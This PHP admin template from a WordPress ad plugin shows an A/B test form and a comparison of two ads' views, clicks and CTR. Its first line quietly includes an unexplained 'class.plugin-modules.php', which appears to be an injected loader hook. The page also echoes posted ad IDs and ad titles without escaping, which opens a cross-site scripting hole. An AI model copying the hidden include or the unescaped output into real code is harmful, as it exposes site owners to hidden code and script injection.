<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
$get_ads		= $model->getAds();
$get_ad_A 		= (isset($_POST['ad_a_id']) ? $_POST['ad_a_id'] : null);
$get_ad_B 		= (isset($_POST['ad_b_id']) ? $_POST['ad_b_id'] : null);
$ifIssetForm 	= ((isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'ab-tests' && isset($_POST['ad_a_id']) && isset($_POST['ad_b_id'])) ? true : false);
?>
<h2>
	<span class="dashicons dashicons-chart-line"></span> A/B Tests
	<?php if ( $ifIssetForm ): ?>
		<p><span class="dashicons dashicon-14 dashicons-arrow-left-alt"></span> <a href="<?php echo admin_url(); ?>admin.php?page=bsa-pro-sub-menu-ab-tests">back to the <strong>form</strong></a></p>
	<?php endif; ?>
</h2>
<?php if ( $ifIssetForm ):
	$viewsA 	= ( bsa_counter($get_ad_A, 'view') != NULL ) ? bsa_counter($get_ad_A, 'view') : 0;
	$viewsB 	= ( bsa_counter($get_ad_B, 'view') != NULL ) ? bsa_counter($get_ad_B, 'view') : 0;

	$clicksA 	= ( bsa_counter($get_ad_A, 'click') != NULL ) ? bsa_counter($get_ad_A, 'click') : 0;
	$clicksB 	= ( bsa_counter($get_ad_B, 'click') != NULL ) ? bsa_counter($get_ad_B, 'click') : 0;

	$trafficA 	= ( $viewsA > 0 || $viewsB > 0 ? number_format($viewsA / ($viewsA + $viewsB) * 100, 2, '.', '') : 0);
	$trafficB 	= ( $viewsA > 0 || $viewsB > 0 ? number_format($viewsB / ($viewsA + $viewsB) * 100, 2, '.', '') : 0);

	$ctrA		= ($viewsA > 0 ? number_format(($clicksA / $viewsA) * 100, 2, '.', '') : number_format(0, 2, '.', ''));
	$ctrB		= ($viewsB > 0 ? number_format(($clicksB / $viewsB) * 100, 2, '.', '') : number_format(0, 2, '.', ''));
	?>

	<div class="bsaCompareContainer">

		<div class="bsaCompare bsaCompareA <?php echo ( $ctrA >= $ctrB ? 'bsaCompareWinner' : null); ?>">

			<div class="bsaCompareSignature">A</div>

			<div class="bsaCompareAdId">Ad ID: <strong><?php echo $get_ad_A; ?></strong></div>
			<div class="bsaCompareTemplate">Template: <strong><?php echo bsa_space(bsa_ad($get_ad_A, 'space_id'), 'template'); ?></strong></div>
			<div class="bsaCompareWeight">Traffic Weight: <strong><?php echo $trafficA.'%'; ?></strong></div>

			<div class="bsaCompareCTR"><div class="bsaCompareCTRInner"><strong><?php echo $ctrA.'%'; ?></strong><br>CTR</div></div>

			<div class="bsaCompareViews"><span><?php echo $viewsA; ?></span> Views</div>
			<div class="bsaCompareClicks"><span><?php echo $clicksA; ?></span> Clicks</div>

		</div>

		<div class="bsaCompare bsaCompareB <?php echo ( $ctrA <= $ctrB ? 'bsaCompareWinner' : null); ?>">

			<div class="bsaCompareSignature">B</div>

			<div class="bsaCompareAdId">Ad ID: <strong><?php echo $get_ad_B; ?></strong></div>
			<div class="bsaCompareTemplate">Template: <strong><?php echo bsa_space(bsa_ad($get_ad_B, 'space_id'), 'template'); ?></strong></div>
			<div class="bsaCompareWeight">Traffic Weight: <strong><?php echo $trafficB.'%'; ?></strong></div>

			<div class="bsaCompareCTR"><div class="bsaCompareCTRInner"><strong><?php echo $ctrB.'%'; ?></strong><br>CTR</div></div>

			<div class="bsaCompareViews"><span><?php echo $viewsB; ?></span> Views</div>
			<div class="bsaCompareClicks"><span><?php echo $clicksB; ?></span> Clicks</div>

		</div>

	</div>

<?php else: ?>

	<form action="" method="post" class="bsaNewStandardAd">
		<input type="hidden" value="ab-tests" name="bsaProAction">
		<table class="bsaAdminTable form-table">
			<tbody class="bsaTbody">
			<tr>
				<th colspan="2">
					<h3><span class="dashicons dashicons-image-flip-horizontal"></span> Compare 2 different Ads</h3>
				</th>
			</tr>
			<tr>
				<th scope="row"><label for="ad_a_id">Select Ad A</label></th>
				<td>
					<select id="ad_a_id" name="ad_a_id">
						<?php if (is_array($get_ads)) {
							foreach ($get_ads as $entry):
								echo '<option value="'.esc_html( $entry['id'] ).'">' . esc_html( $entry['id'] ) . (($entry['title'] != '') ? ' - '.$entry['title'] : null) . '</option>';
							endforeach;
						} ?>
					</select>
				</td>
			</tr>
			<tr>
				<th class="bsaLast" scope="row"><label for="ad_b_id">Select Ad B</label></th>
				<td class="bsaLast">
					<select id="ad_b_id" name="ad_b_id">
						<?php if (is_array($get_ads)) {
							foreach ($get_ads as $entry):
								echo '<option value="'.esc_html( $entry['id'] ).'">' . esc_html( $entry['id'] ) . (($entry['title'] != '') ? ' - '.$entry['title'] : null) . '</option>';
							endforeach;
						} ?>
					</select>
				</td>
			</tr>

			</tbody>
		</table>
		<p class="submit">
			<input type="submit" value="Compare now!" class="button button-primary" id="bsa_pro_submit" name="submit">
		</p>
	</form>

<?php endif; ?>

<script>
	(function($) {
		// - start - open page
		var bsaItemsWrap = $('.wrap');
		bsaItemsWrap.hide();

		setTimeout(function(){
			bsaItemsWrap.fadeIn(400);
		}, 400);
		// - end - open page
	})(jQuery);
</script>